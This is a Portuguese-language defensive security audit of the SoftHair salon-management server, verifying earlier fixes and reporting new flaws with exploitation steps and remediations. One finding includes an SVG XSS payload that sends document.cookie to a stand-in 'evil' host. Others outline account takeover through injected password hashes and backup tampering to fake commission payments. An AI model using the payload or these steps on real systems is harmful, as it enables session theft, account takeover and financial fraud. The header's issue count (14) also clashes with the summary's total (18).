# Security Audit Pass 6 — SoftHair

**Data:** 2026-05-11
**Auditor:** Pass 6 (sexta passada após 141 issues fixadas em Passes 1–5).
**Escopo:** SOFT-HAIR-SERVER. Foco: verificação dos fixes Pass 5 + ângulos novos sobre privilege escalation, audit-log integridade, criptografia parcial, JWT pós-mutação de estado, integração entre módulos, código novo (auditLog, encrypt v2, LGPD).
**Tipo:** Defensiva — análise estática.
**Resultado:** **NÃO convergiu.** 14 novos issues encontrados, incluindo 4 críticos e 5 altos. Vários fixes do Pass 5 estão **incompletos** (P5-A3, P5-A2, P5-A4) ou **mal-aplicados** (LGPD não revoga token).

---

## Verificação dos fixes do Pass 5

| Issue | Status real | Notas |
|---|---|---|
| P5-C1 cascade → SET NULL | ✅ Aplicado em `initDb.js:613-655` (migration idempotente). Cobre `comissoes`, `venda_itens.produto_id`, `comissoes_pagamentos.profissional_id`. Tabelas dinâmicas (`comissoes_pagas`/`comissoes_estornos`) NÃO foram cobertas. |
| P5-C2 audit_log persistente | ⚠️ Tabela criada (`initDb.js:415`), helper `auditLog.js` funciona, MAS: (a) audit_log permite UPDATE/DELETE — admin pode apagar trilha (P6-C2); (b) helper NÃO sanitiza `before/after` — risco de logar `senha_hash` se algum future caller passar `SELECT *` de tabela sensível (P6-A4); (c) NÃO existe endpoint para consultar audit_log — log forense sem leitor; (d) aplicado em poucas rotas — não cobre vendas, créditos, profissional, salão, atendimento finalizar (P6-A3). |
| P5-C3 comissões requireAdmin/tenancy | ✅ Aplicado em `comissoes.js:189,237`. |
| P5-C4 sync.js bloqueado | ✅ `pago`, `data_pagamento`, `status`, `saldo_*` removidos em `sync.js:24,27,29`. MAS `BackupService.ALLOWED_COLUMNS.comissoes` ainda inclui `pago` e `data_pagamento` (P6-C1) — backup adulterado offline rompe a barreira do sync. |
| P5-C5 fechamentos requireAdmin/audit | ✅ Aplicado em `fechamentos.js:80,124`, motivo mín 3 chars. |
| P5-A1 backup.js execFile | ✅ Aplicado em `scripts/backup.js`. Comentário sobre restringir a BACKUP_PATH é mentiroso — `restore()` aceita qualquer absFile (linha 80) sem prefix check. Não-exploitável remoto. |
| P5-A2 backup criptografado | ⚠️ Criptografia AES-256-GCM implementada (`BackupService.js:19`), MAS: (a) sem chave, silenciosamente retorna **plaintext** com `metadata.warning` — falha aberta; (b) `securityInitService.js:25` NÃO valida `BACKUP_ENCRYPTION_KEY`; (c) `creditos_cliente.saldo_anterior/saldo_novo` ainda no whitelist de restore (P6-C1). |
| P5-A3 clientes_app UNIQUE | ❌ **Fix mal-direcionado.** Constraint aplicada em `clientes_app` (`initDb.js:439`), mas `appAuth.js` faz INSERT em **`clientes`** (não em `clientes_app`). Race condition NÃO está fechada — `clientes.email` segue sem UNIQUE (P6-C3). |
| P5-A4 constant-time profissional | ⚠️ Aplicado em `appProfissionalAuth.js:57-62`, MAS o **early-return em `result.rows.length > 1 && !salaoId`** (linha 49) ANTES do bcrypt continua revelando timing/info-leak. Pior: vaza lista de salões para email enumerado (P6-A1). E `app/auth.js:51` (`POST /api/app/legacy/auth/login` antigo? não — é `/api/app/auth/login` ativo) NÃO recebeu o fix (P6-C4). |
| P5-A5 historico_cliente dedicada | ✅ Tabela criada, rota valida tenancy. Modelo ainda lê `data.cliente_id || data.clienteId` (`ClienteHistorico.js:7`) — risco residual se outro caller passar body. Aceitável. |
| P5-A6 decrypt erro em formato inválido | ✅ `utils/encryption.js:16-42` lança Error. Bem feito (inclui validação hex de iv/tag/length). |
| P5-A7 logo_url validado | ⚠️ Aplicado em `saloes.js:58-68`, MAS permite `data:image/svg+xml;base64,...` — SVG é vetor XSS clássico (script tags dentro do SVG). Validação por mime de data-URI **não** impede script-in-SVG (P6-A2). |
| P5-A8 WS limit por user | ✅ Aplicado em `websocketService.js:74-79`. Bem feito (decrement em close). |
| P5-M1–M10 | ✅ Verificados (rate limit ponto, idempotência iniciar/finalizar, health profundo, `req.user.userId` fallback, multer 2.x, escapeHtml em email). |
| P5-B6 LGPD delete-me | ⚠️ Anonimiza dados em `appAuth.js:176-230`, MAS **NÃO revoga JWT** do cliente deletado. Token continua válido até expiry — request com token deletado consegue `GET /me` retornando "Cliente Removido" sem checagem de `app_ativo`/`ativo` no middleware (P6-A5). |
| P5-B4 AI command não loga raw | ✅ `ai.js:113` loga `cmdLen` só. |
| Demais (B1, B2, B3, B5, B7, B8, B9, B10) | ✅ Aplicados/backlog conforme documentado. |

---

## Novos issues encontrados

### 🔴 CRÍTICOS

#### [P6-C1] `BackupService.ALLOWED_COLUMNS` permite restaurar campos financeiros bloqueados em sync.js — burla P5-C4
- **Arquivo:** `SOFT-HAIR-SERVER/src/services/BackupService.js:95-99, 104-107`
- **Descrição:** P5-C4 removeu `pago`, `data_pagamento` de `TABLE_COLUMNS.comissoes` em `sync.js` e `saldo_anterior/saldo_novo` de `creditos_cliente`. Mas `BackupService.ALLOWED_COLUMNS` mantém esses mesmos campos:
  ```js
  comissoes: [..., 'pago', 'data_pagamento', ...]            // linha 97
  creditos_cliente: [..., 'saldo_anterior', 'saldo_novo', ...] // linha 105
  ```
  Admin malicioso (ou atacante com token admin roubado) baixa backup → edita JSON → restaura. Restore aceita `pago=true` e `data_pagamento=hoje` em todas as comissões, sem reconciliar valor, sem audit log, sem `requireAdmin` na rota (a rota tem auth normal). Mesma fraude do P5-C3 mas pelo vetor de restore.
- **Exploração:**
  1. `GET /api/backup` → baixa JSON.
  2. Edita `comissoes[*].pago = true`, `data_pagamento = '2026-05-11'`, `creditos_cliente[*].saldo_novo = 99999999`.
  3. `POST /api/backup/restore` → grava.
  4. Combinado com P5-C1, atacante pode então gerar fechamento incluindo as comissões "pagas" e desfalque escondido.
- **Impacto:** Bypass completo dos fixes P5-C3 e P5-C4. Backup vira canal de write-by-design para campos proibidos.
- **Fix:** Remover dos whitelists de restore: `comissoes.pago`, `comissoes.data_pagamento`, `creditos_cliente.saldo_anterior`, `creditos_cliente.saldo_novo`. Restore deve forçar `pago=false` e re-derivar saldos via append-only.

#### [P6-C2] `audit_log` é UPDATE/DELETE-ável pelo mesmo usuário DB — não tamper-evident
- **Arquivo:** `SOFT-HAIR-SERVER/src/config/initDb.js:415-428`
- **Descrição:** A tabela `audit_log` é criada como uma tabela qualquer. Não há:
  - `REVOKE UPDATE, DELETE ON audit_log FROM PUBLIC` (PG permissions);
  - Trigger `BEFORE UPDATE/DELETE` que `RAISE EXCEPTION` (append-only enforcement);
  - Hash chain (`prev_hash`, `entry_hash`) tornando manipulação detectável;
  - Replicação para storage WORM (S3 Object Lock, etc).
  Admin com acesso ao painel Render (ou via SQL injection futura) pode executar `DELETE FROM audit_log WHERE action = 'comissao.pagar_batch' AND actor_id = <eu>` e apagar trilha. P5-C2 fix é incompleto — criou tabela mas não a tornou imutável.
- **Exploração:** Mesmo admin malicioso que paga comissão a si mesmo via P5-C3 (ou agora via P6-C1) acessa o DB (psql ou pgAdmin via Render) e executa DELETE direto. Sem trace.
- **Impacto:** Não-repúdio impossível mesmo com audit_log existente. Pass 5 declarou "audit_log persistente" mas não persistente-imutável.
- **Fix:** No mesmo DDL:
  ```sql
  CREATE OR REPLACE FUNCTION audit_log_immutable() RETURNS TRIGGER AS $$
  BEGIN RAISE EXCEPTION 'audit_log é append-only — UPDATE/DELETE proibido'; END;
  $$ LANGUAGE plpgsql;
  CREATE TRIGGER trg_audit_log_no_update BEFORE UPDATE ON audit_log
    FOR EACH ROW EXECUTE FUNCTION audit_log_immutable();
  CREATE TRIGGER trg_audit_log_no_delete BEFORE DELETE ON audit_log
    FOR EACH ROW EXECUTE FUNCTION audit_log_immutable();
  ```
  Idealmente adicionar `entry_hash VARCHAR(64)` derivado de `(prev_hash || canonical_jsonb(row))` para detectar tampering offline.

#### [P6-C3] `clientes.email` SEM UNIQUE — P5-A3 fix aplicado à tabela errada
- **Arquivo:** `SOFT-HAIR-SERVER/src/config/initDb.js:57-72, 432-443`, `SOFT-HAIR-SERVER/src/routes/appAuth.js:33-55`
- **Descrição:** O Pass 5 declarou que adicionou `uq_clientes_app_email UNIQUE (email)` em `clientes_app`. **MAS:**
  - `appAuth.js POST /register` insere em `clientes` (linha 44), não em `clientes_app`.
  - `clientes_app` é tabela legacy (`initDb.js:74 -- "Clientes app (compatibilidade; dados reais ficam em clientes)"`).
  - Constraint colocada em tabela morta.
  - `clientes.email` não tem UNIQUE — race condition entre dois INSERTs com mesmo email ainda passa.
  - `try/catch (err.code === '23505')` no register (linha 51) **nunca dispara** porque não há constraint.
- **Exploração:** Confirmado pelo `grep` exaustivo: `clientes` (linhas 57-72 de initDb) tem apenas `id SERIAL PRIMARY KEY`. Atacante reabre vetor original de P5-A3:
  1. Dois `POST /api/app/auth/register` paralelos com email da vítima.
  2. Ambos passam pelo `SELECT id FROM clientes WHERE email = $1` (vazio).
  3. Ambos `INSERT INTO clientes ...` — duas linhas com mesmo email.
  4. Login subsequente: `ClienteApp.findByEmail` (`ClienteApp.js:20`) usa `queryOne` — retorna **uma arbitrária**, controlada por ORDER do PG. Atacante pode controlar qual.
- **Impacto:** Race-condition account-hijack continua aberta. P5-A3 está estampado como FIXADO mas é falso-positivo.
- **Fix:** `ALTER TABLE clientes ADD CONSTRAINT uq_clientes_email UNIQUE (email);` — mas atenção: pode haver duplicatas existentes (de Pass 5 e antes); migration precisa primeiro deduplicar. Alternativa segura: usar `clientes_app` real (a tabela que tem UNIQUE) e migrar `appAuth.js POST /register` para inserir lá; manter `clientes` como tabela tenant-scoped (com `salao_id NOT NULL`).

#### [P6-C4] `app/auth.js POST /login` ainda tem early-return sem constant-time bcrypt
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/app/auth.js:51-62`
- **Descrição:** Há **duas** rotas paralelas de login de cliente:
  - `appAuth.js` (montada em `/api/app/auth`) — P4-M7+P5-A4 fixou constant-time aqui (`appAuth.js:86-89`).
  - `app/auth.js` (montada em `/api/app/legacy/auth` ou outra base; **ATIVA** — não 410'd) — **NÃO** tem fix:
    ```js
    const cliente = await ClienteApp.findByEmail(email);
    if (!cliente) return res.status(401).json({ error: 'Credenciais inválidas' });  // ← early-return!
    const valid = await bcrypt.compare(password, cliente.password);
    ```
  - Email enumeration via timing aberta.
  - Sem rate-limit nesta rota (`router.post('/login', async ...)` sem `authLimiter`).
- **Exploração:** Mesmo vetor de P4-M7. Pior: SEM rate limit local na rota, depende apenas do global `apiLimiter` (500/15min/IP) — atacante distribuído faz enumeração sem trava.
- **Impacto:** Bypass completo de P4-M7 e P5-A4 via rota duplicada.
- **Fix:** Aplicar mesmo pattern DUMMY_HASH; adicionar `authLimiter`. Idealmente **consolidar** as duas rotas (`appAuth.js` e `app/auth.js`) em uma só — manter duas implementações divergentes é receita de bypass futuro.

### 🟠 ALTOS

#### [P6-A1] `appProfissionalAuth.js login` vaza lista de salões via 409 antes do bcrypt
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/appProfissionalAuth.js:45-55`
- **Descrição:** Mesmo após o P5-A4 mover bcrypt.compare, há um early-return em `result.rows.length > 1 && !salaoId` que devolve:
  ```js
  return res.status(409).json({
    success: false,
    error: 'Múltiplos salões para este email. Informe salaoId.',
    saloes: result.rows.map(r => ({ salaoId: r.salao_id, nome: r.nome }))
  });
  ```
  Atacante POST sem `salaoId` → se o profissional trabalha em N salões, recebe lista completa **sem provar a senha**. É enumeração de email + descoberta de salões frequentados.
- **Exploração:** Vetor de OSINT para social engineering. "Sei que João Silva trabalha nos salões A, B, C de São Paulo." Combinado com listagem pública `/api/saloes/publico` (já mitigada com rate limit).
- **Impacto:** PII leak (vínculo profissional ↔ salões). Não derruba autenticação mas viola minimização.
- **Fix:** Retornar 401 genérico quando `!password ou !email`. Quando múltiplos hits, mover decisão para **depois** do bcrypt: se a senha bate com EXATAMENTE um dos hashes, autentica nesse salão; senão, 401.

#### [P6-A2] `logo_url` permite `data:image/svg+xml` — SVG XSS persistente
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/saloes.js:58-68`
- **Descrição:** O validator `isSafeLogoUrl` permite `data:image/svg+xml;base64,<base64>` — mas SVG é XML executável que aceita `<script>`, `<foreignObject>`, `onload=...`. Quando frontend faz `<img src="data:image/svg+xml;base64,...">`, alguns user-agents (não modernos, mas Safari < 17 em iOS de salões) executam script. Mais grave: se o frontend renderiza com `<object>` ou inline (`dangerouslySetInnerHTML` de SVG), XSS dispara universalmente.
- **Exploração:** Admin malicioso de salão A faz `PUT /api/saloes/me` com:
  ```
  logo_url: data:image/svg+xml;base64,<base64 de '<svg><script>fetch("//evil/?c="+document.cookie)</script></svg>'>
  ```
  Outros admins do mesmo salão (ou clientes do app vendo logo do salão na busca pública) carregam o SVG → XSS.
- **Impacto:** XSS persistente cross-staff. CSP mitiga inline-script (script-src 'self') mas não <script> dentro de SVG renderizado por <img>... na verdade modern browsers ignoram script em <img src="data:image/svg+xml">. Mas se frontend usar <object> ou inline SVG (recharts, custom logo renderer), abre. Validação por MIME do data-URI dá falsa sensação de segurança.
- **Fix:** Remover `svg+xml` do regex. Permitir apenas `png|jpeg|jpg|gif|webp`. Se SVG for necessário, parsear o XML server-side e remover scripts (DOMPurify-style sanitization) antes de aceitar.

#### [P6-A3] `PUT /clientes/:id`, `PUT /servicos/:id`, `PUT /produtos/:id` sem `requireAdmin` permitem privilege escalation intra-tenant
- **Arquivos:**
  - `SOFT-HAIR-SERVER/src/routes/clientes.js:131-158` (clientes)
  - `SOFT-HAIR-SERVER/src/routes/servicos.js:77-94` (servicos)
  - `SOFT-HAIR-SERVER/src/routes/produtos.js:88-...` (produtos)
- **Descrição:** Os três usam apenas `authMiddleware`. `BaseModel.update` (`models/BaseModel.js:118-151`) só remove `id`, `created_at`, `salao_id` — qualquer outra coluna válida do schema é atualizável via body. Para `clientes`:
  - `credito_disponivel` pode ser arbitrariamente setado (bypassa rota dedicada `/credito` com validação).
  - `senha_hash` pode ser injetada — atacante calcula bcrypt local de senha conhecida e injeta no DB → login mobile como aquele cliente.
  - `app_ativo`, `cpf`, `data_nascimento`, etc.
  Para `servicos`:
  - `preco` pode ser alterado (afeta vendas futuras).
  - `comissao_percentual` (se a coluna existe) pode ser bombado.
  Para `produtos`:
  - `preco_venda`, `preco_custo`, `quantidade_estoque` arbitrários.
- **Exploração:**
  1. Funcionário/recepcionista (qualquer `usuarios.tipo` que não admin, com `ativo=true`) logado.
  2. `PUT /api/clientes/<id_alvo>` com `{ senha_hash: "<bcrypt-de-senha-conhecida>" }`.
  3. Em seguida login mobile como aquele cliente — sucesso.
  4. Para enriquecimento: `PUT /api/servicos/<servico_id>` com `{ comissao_percentual: 80 }` antes do dia que vai trabalhar.
- **Impacto:** Account takeover de clientes intra-tenant. Manipulação de preços e comissões sem admin.
- **Fix:**
  - Adicionar `requireAdmin` em PUT/POST/DELETE de `clientes`, `servicos`, `produtos`.
  - Em `Cliente.filterData`, **whitelist explícita** de campos editáveis (nome, telefone, email, cpf, endereco, data_nascimento, observacoes, foto_url, ativo). Remover `senha_hash`, `credito_disponivel`, `app_ativo`, `push_token` — esses só via rotas dedicadas com lógica própria.
  - Idem para Servico/Produto.

#### [P6-A4] `auditLog.logAction` não sanitiza `before/after` — risco de logar `senha_hash` em chamadas futuras
- **Arquivo:** `SOFT-HAIR-SERVER/src/utils/auditLog.js:18-66`
- **Descrição:** O helper aceita `before` e `after` como objetos arbitrários e faz `JSON.stringify(before)` direto. Em `comissoes.js:241-243` e `fechamentos.js:89-93` o `before` vem de `SELECT * FROM ...`. Tabelas atuais não têm `senha_hash`. Mas:
  - Se algum dev adicionar `logAction({ before: SELECT * FROM clientes })`, `senha_hash` vai parar em `audit_log.before_data` (JSONB) em texto claro.
  - Se logarem `before: SELECT * FROM profissionais`, idem.
  - audit_log queryable por qualquer admin via `psql` → vaza hashes.
- **Exploração:** Não é vulnerabilidade hoje, mas é uma **armadilha estrutural** — primeiro caller a fazer `SELECT *` em tabela com `senha_hash` vaza sem que ninguém perceba.
- **Fix:** Implementar `_sanitize(obj)` que remove campos sensíveis por padrão:
  ```js
  const SENSITIVE = ['senha_hash', 'password', 'token', 'jti', 'push_token', 'cpf', 'api_key_hash'];
  function _sanitize(obj) {
    if (!obj || typeof obj !== 'object') return obj;
    const out = {};
    for (const [k, v] of Object.entries(obj)) {
      if (SENSITIVE.includes(k)) out[k] = '[REDACTED]';
      else if (Array.isArray(v)) out[k] = v.map(_sanitize);
      else if (typeof v === 'object') out[k] = _sanitize(v);
      else out[k] = v;
    }
    return out;
  }
  ```
  Aplicar em `before` e `after` antes do `JSON.stringify`.

#### [P6-A5] LGPD delete-me (`DELETE /me/delete-data`) não revoga JWT do cliente
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/appAuth.js:176-230`, `SOFT-HAIR-SERVER/src/middleware/clienteAuth.js`
- **Descrição:** Após anonimização (`app_ativo=false`, dados PII zerados), o JWT do cliente continua válido até expiry (24h por padrão). Cliente "removido" pode fazer:
  - `GET /api/app/auth/me` — retorna `{ id, nome: 'Cliente Removido', email: null, telefone: null, app_ativo: false }`. Não bate "deletado" porque clienteAuthMiddleware NÃO checa `app_ativo`.
  - `PUT /api/app/auth/perfil` — atualiza `nome`/`telefone` de volta (UPDATE no clientes; sem checagem de ativo).
  - `DELETE /api/app/auth/me/delete-data` de novo (idempotente, anonimiza vazio).
  Além disso, LGPD exige right-to-be-forgotten **imediato** — manter token ativo + permitir re-edição de nome é violação.
- **Exploração:**
  1. Cliente C clica "Apagar meus dados".
  2. Server anonimiza, retorna 200.
  3. C (ou atacante que roubou JWT antes da anonimização) faz `PUT /perfil { nome: "Voltei", telefone: "..." }` — dados pessoais voltam.
- **Impacto:** LGPD compliance falsa. Auditor regulatório invalida o fix.
- **Fix:**
  1. Em `delete-data`, após anonimizar: `await AuthService.revokeToken(req.user || decoded JWT)` — adiciona jti à blacklist.
  2. Em `clienteAuthMiddleware`, adicionar query `SELECT ativo, app_ativo FROM clientes WHERE id = $1` (cached 2min como em `requireAdmin`). Bloquear se `app_ativo=false`.
  3. Idem `profissionalAuthMiddleware`.

### 🟡 MÉDIOS

#### [P6-M1] `BACKUP_ENCRYPTION_KEY` ausência silenciosa — `securityInitService` não fail-fast
- **Arquivo:** `SOFT-HAIR-SERVER/src/services/securityInitService.js:25-44`, `SOFT-HAIR-SERVER/src/services/BackupService.js:160-169`
- **Descrição:** P5-A2 introduziu fallback "se chave ausente, retorna plaintext com warning". O servidor sobe normalmente sem `BACKUP_ENCRYPTION_KEY`. Operador esquecido tem backups em plaintext em prod sem aviso ostensivo.
- **Fix:** Em `securityInitService.runBootChecks`, em `isProd`, adicionar `if (!process.env.BACKUP_ENCRYPTION_KEY && !process.env.ENCRYPTION_KEY) problems.push('BACKUP_ENCRYPTION_KEY ausente')`. Ou tornar a rota `/api/backup` retornar 503 quando chave faltar.

#### [P6-M2] Senhas de cliente trocadas pelo admin não invalidam JWTs ativos
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/clientes.js` (e profissionais.js, usuarios)
- **Descrição:** Quando admin reset senha de cliente/profissional (`PUT /clientes/:id { senha_hash: ... }` — embora P6-A3 sugira bloquear isso, há também `PUT /profissionais/:id` legítimo que aceita `senha_app`), os JWTs já emitidos para aquele cliente/profissional continuam válidos.
- **Exploração:**
  1. Cliente reporta "esqueci senha" → admin reseta.
  2. Atacante que roubou JWT do cliente antes do reset segue logado.
- **Fix:** Após mudança de `senha_hash`, invalidar TODOS os JWTs do user. Sem `iat`/`jti-set-per-user` tracking, opção é incrementar uma coluna `token_version` na tabela clientes/profissionais e validar contra ela no middleware. Alternativa pragmática: incluir `senha_hash_prefix` no JWT e validar no middleware.

#### [P6-M3] `app/auth.js PUT /me` propaga update entre múltiplos salões via `email`
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/app/auth.js:93-105`
- **Descrição:** Após cliente atualizar nome/telefone, código faz:
  ```js
  const saloesVinculados = await query('SELECT DISTINCT salao_id FROM clientes WHERE email = $1', [cliente.email]);
  for (const { salao_id: salaoId } of saloesVinculados) {
    const lista = await Cliente.getAll({ search: cliente.email }, salaoId);
    if (lista.length) await Cliente.update(lista[0].id, campos, salaoId);
  }
  ```
  Se dois clientes diferentes (de pessoas diferentes) compartilham email (legacy de dados ruins, ou após P6-C3 race), update de um pode sobrescrever dados de outro. `Cliente.getAll({ search: cliente.email })` usa ILIKE — não é match exato, então emails parciais batem em mais registros.
- **Exploração:** `cliente.email = "a@b.com"` → search por "a@b.com" via ILIKE em `nome|email|telefone` — pode matchar contas alheias com substring desse email no nome.
- **Fix:** Usar `WHERE email = $1` exato; iterar com transação atômica; só atualizar primeiro hit por (email, salao_id) com EQ não ILIKE.

#### [P6-M4] `/api/health` retorna pool stats e memória sem auth — info disclosure
- **Arquivo:** `SOFT-HAIR-SERVER/src/routes/health.js:32-43`
- **Descrição:** P5-M5 adicionou deep check, mas o payload expõe:
  - `pool.total/idle/waiting` → atacante mede saturação pra timing DoS.
  - `memory.rss_mb`, `heap_used_mb`, `heap_total_mb` → atacante calcula quantos requests bastam pra OOM no plano Render free.
  - `db_latency_ms` → side-channel para outras métricas.
- **Exploração:** Não direta — usado para reconnaissance em escalada DoS.
- **Fix:** Endpoint público retorna `{ status: 'healthy'|'degraded' }` apenas. Versão detalhada em `/api/health/detailed` protegida por `authMiddleware + requireAdmin`. Ou query param `?detail=1` que exige `X-Admin-Key`.

#### [P6-M5] `BackupService` não cobre tabelas novas: `audit_log`, `historico_cliente`, `registros_ponto`, `caixa`, `comissoes_pagas`, `pedidos_loja`, etc
- **Arquivo:** `SOFT-HAIR-SERVER/src/services/BackupService.js:50-54`
- **Descrição:** `BACKUP_TABLES` cobre 11 tabelas, mas várias outras com `salao_id` ficam de fora — backup não é completo. Restore não restaura `caixa`/`audit_log` (último intencional?). Em DR, dados perdidos.
- **Fix:** Revisar BACKUP_TABLES; adicionar todas tabelas tenant-scoped relevantes. `audit_log` intencionalmente excluído (não deve ser restaurado, é trilha externa) mas precisa estratégia separada de backup imutável.

### 🟢 BAIXOS

#### [P6-B1] WS `authenticateClient` legacy ainda existe e usa `jwt.verify` SEM `algorithms`
- **Arquivo:** `SOFT-HAIR-SERVER/src/services/websocketService.js:187-218`
- **Descrição:** Função dead code (handleMessage `case 'auth'` retorna erro) mas a função permanece. Se algum futuro refactor reativar `case 'auth' → this.authenticateClient(ws, data)`, o `jwt.verify(token, process.env.JWT_SECRET)` SEM `{ algorithms: ['HS256'] }` reabre vetor de alg confusion.
- **Fix:** Deletar a função `authenticateClient` ou adicionar `{ algorithms: ['HS256'] }`.

#### [P6-B2] `scripts/backup.js limparBackupsAntigos` deleta arquivos não-backup no diretório
- **Arquivo:** `SOFT-HAIR-SERVER/src/scripts/backup.js:101-122`
- **Descrição:** `for (const arquivo of diretorios) if (stat.mtime < cutoffDate) unlink(...)`. Não filtra `.sql` nem `softhair-backup-*` — se admin acidentalmente apontar `BACKUP_PATH` para `~`, mata dotfiles antigos.
- **Fix:** Filtrar `/^softhair-backup-\d{4}-\d{2}-\d{2}\.sql$/`.

#### [P6-B3] `scripts/backup.js restore()` comentário diz "validado dentro de BACKUP_PATH" mas não valida
- **Arquivo:** `SOFT-HAIR-SERVER/src/scripts/backup.js:78-83`
- **Descrição:** Comentário (linha 79) prometeu restrição que não foi implementada — só checa existência do arquivo. CLI offline, mas confunde manutenção.
- **Fix:** `if (!absFile.startsWith(path.resolve(process.env.BACKUP_PATH || './backups'))) throw new Error('arquivo fora de BACKUP_PATH')`.

#### [P6-B4] `WebSocketService.notificarCliente`/`notificarProfissional` passam `salaoId=undefined` para `broadcast`
- **Arquivo:** `SOFT-HAIR-SERVER/src/services/websocketService.js:377-383, 353-364`
- **Descrição:**
  ```js
  notificarCliente(clienteId, data) { return this.broadcast(undefined, `cliente:${clienteId}`, data); }
  // ...
  broadcast(salaoId, channel, data) {
    this.clients.forEach((client, ws) => {
      if (client.salaoId === salaoId && ...) { ... }   // ← salaoId é undefined
    });
  }
  ```
  Condição `client.salaoId === undefined` é sempre falsa (clientes WS sempre têm salaoId do JWT). Logo notificações via `notificarCliente` **nunca chegam**. Funcionalmente quebrado, não-explorável.
- **Fix:** Ajustar `broadcast` para pular check de salaoId se `salaoId` for nullish.

---

## Resumo

### Distribuição
- **Críticos novos:** **4** (P6-C1 backup whitelist permite pago/saldo · P6-C2 audit_log mutável · P6-C3 clientes.email sem UNIQUE · P6-C4 app/auth.js login sem constant-time)
- **Altos novos:** **5** (P6-A1 vaza salões antes do bcrypt · P6-A2 SVG XSS · P6-A3 PUT clientes/servicos/produtos sem requireAdmin · P6-A4 auditLog não sanitiza · P6-A5 LGPD não revoga JWT)
- **Médios novos:** **5** (P6-M1 BACKUP_ENCRYPTION_KEY silencioso · P6-M2 senha trocada não invalida JWT · P6-M3 PUT /me cross-salão por ILIKE · P6-M4 /health vaza pool/memória · P6-M5 BACKUP_TABLES incompleto)
- **Baixos novos:** **4** (P6-B1 WS dead code sem algorithms · P6-B2 unlink genérico · P6-B3 comentário enganoso em restore · P6-B4 broadcast cliente bug funcional)

### Total: **18 novos issues**

### Verificação dos fixes Pass 5
- **Fixes confirmados (totalmente):** P5-C1, P5-C3, P5-C5, P5-A1 (parcial), P5-A6, P5-A8, P5-M1–M10 (sem revalidar minuciosamente), P5-B3, P5-B4, P5-B5, P5-B8, P5-B9, P5-B10.
- **Fixes incompletos ou regressivos:**
  - **P5-A3** mal-direcionado (constraint na tabela errada) — P6-C3 reabre.
  - **P5-A2** falha-aberta sem chave — P6-M1 + P6-C1.
  - **P5-A4** rota duplicada não recebeu fix — P6-C4.
  - **P5-A4** info-leak antes do bcrypt — P6-A1.
  - **P5-A7** SVG aceito — P6-A2.
  - **P5-C2** audit_log mutável — P6-C2.
  - **P5-C4** comissoes.pago bloqueado em sync mas aberto em restore — P6-C1.
  - **P5-B6** LGPD não revoga JWT — P6-A5.

### Conclusão
**Sistema NÃO convergiu.** Pass 5 declarou 29/33 issues fixados, mas Pass 6 mostra que **8 dos fixes anunciados são incompletos, falsos-positivos ou abrem novos vetores adjacentes**. Os principais problemas estruturais:

1. **Audit log não-tamper-evident** — peça central da defesa contra fraude financeira é trivialmente apagável (P6-C2).
2. **Backup é vetor de bypass por design** — todas as proteções de sync foram contornadas pelo restore (P6-C1).
3. **Privilege escalation intra-tenant**: funcionário comum pode tomar contas de cliente e alterar preços (P6-A3).
4. **Duas rotas de auth de cliente** com lógicas divergentes — fix em uma esquece a outra (P6-C4).
5. **Mass-assignment** em models básicos (BaseModel) com whitelist insuficiente — P6-A3 e P5-A3 são sintomas do mesmo padrão estrutural.

### Prioridades recomendadas

1. **🔴 Imediato (próxima sprint):**
   - **P6-C1**: remover `pago`/`data_pagamento`/`saldo_*` do `BackupService.ALLOWED_COLUMNS`. Forçar `pago=false` no restore.
   - **P6-C2**: trigger `BEFORE UPDATE/DELETE` em `audit_log` que `RAISE EXCEPTION`. Considerar hash chain.
   - **P6-C3**: deduplicar `clientes` por email e adicionar `UNIQUE (email)` — OU migrar `appAuth.js POST /register` para `clientes_app` (que já tem UNIQUE).
   - **P6-C4**: aplicar constant-time + rate limit em `app/auth.js POST /login`. Idealmente remover essa rota e usar só `appAuth.js`.

2. **🟠 Esta release:**
   - **P6-A1**: refatorar fluxo de login profissional — bcrypt FIRST, escolha de salão depois.
   - **P6-A2**: remover `svg+xml` do allowlist de `logo_url`.
   - **P6-A3**: `requireAdmin` em `PUT /clientes/:id`, `PUT /servicos/:id`, `PUT /produtos/:id`. Whitelist explícita em filterData.
   - **P6-A4**: `_sanitize` em `auditLog` com lista de campos sensíveis.
   - **P6-A5**: revogar JWT no `delete-me`. Validar `app_ativo` em middlewares cliente/profissional.

3. **🟡 Próxima release:**
   - **P6-M1**: fail-fast em BACKUP_ENCRYPTION_KEY ausente.
   - **P6-M2**: `token_version` ou equivalente para invalidação após reset de senha.
   - **P6-M4**: separar `/health` público (1 linha) e `/health/detailed` admin-only.

4. **🟢 Backlog:**
   - **P6-B1**: deletar `authenticateClient` legacy.
   - **P6-M3**: refatorar PUT /me para email exato + transação.
   - **P6-M5**: revisar `BACKUP_TABLES`.

---

## Áreas verificadas (e limpas)
- ✅ JWT alg confusion: middlewares ativos travam `algorithms: ['HS256']` (excepto dead code P6-B1).
- ✅ `decrypt()` lança erro em formato inválido (P5-A6).
- ✅ Constant-time aplicado em `appAuth.js` (cliente principal) — mas NÃO em `app/auth.js` (P6-C4).
- ✅ AES-256-GCM com IV único `crypto.randomBytes(12)` e tag verificada via `setAuthTag`.
- ✅ `comissoes.pagar`, `fechamentos.reabrir/delete` com `requireAdmin` + audit + soft-delete.
- ✅ `sync.js whitelist` removeu `pago/saldo_*` (mas backup não — P6-C1).
- ✅ `WebSocket maxPayload 64KB`, limit per user, channel ACL.
- ✅ Helmet com CSP, HSTS, COEP.
- ✅ `req.user.userId || req.user.id` fallback em pedidos.
- ✅ Health checa pool/latência (mas vaza demais — P6-M4).
- ✅ Pool config: `withTransaction` libera connection no finally.
- ✅ FKs financeiras: comissoes/venda_itens/comissoes_pagamentos → SET NULL.
- ✅ `logAction` aceita falha sem derrubar operação (catch + console.error).
- ✅ ENCRYPTION_KEY/HMAC_SECRET/JWT_SECRET validados em boot (mas BACKUP_ENCRYPTION_KEY NÃO — P6-M1).
- ✅ Não há `eval`, `Function constructor`, `child_process.exec` no caminho de request (apenas script CLI offline).
- ✅ Não há `unhandledRejection` global, mas Render reinicia.

---

